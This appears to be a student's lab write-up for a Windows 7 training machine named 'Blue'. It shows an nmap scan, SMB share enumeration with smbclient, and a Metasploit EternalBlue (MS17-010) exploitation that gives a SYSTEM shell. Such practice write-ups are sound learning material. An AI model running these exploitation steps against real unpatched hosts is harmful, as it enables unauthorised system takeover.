
# Blue

A windows machine for PEH capstone 

IP - 192.168.141.129


## Nmap Scan result 

Nmap scan report for 192.168.141.129
Host is up (0.0011s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:8F:F6:12 (VMware)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-16T22:35:02
|_  start_date: 2025-11-16T22:27:36
\|\_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: \<unknown>, NetBIOS MAC: 00:0c:29:8f:f6:12 (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-16T17:35:02-05:00
|_clock-skew: mean: 12h10m00s, deviation: 2h53m12s, median: 10h29m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   1.13 ms 192.168.141.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.26 seconds



searching the version `Windows 7 Ultimate 7601 Service` reveals it is vulnerable to eternal blue attack 

Nmap scan results show very old smb is in use let's try connecting to it with 

```bash
smbclient -L \\\\192.168.141.129\\
```

which reveals there is 3 shares 


ADMIN$
IPC$
C$ 



## Automated : 

Let's start metasploit

	`msfconsole

search eternal blue 

selected the (exploit/windows/smb/ms17_010_eternalblue)

`set RHOST 192.168.141.129`

`exploit`

we got a meterpreter shell and then used `shell` command to get the system shell 

we are **SYSTEM32** 


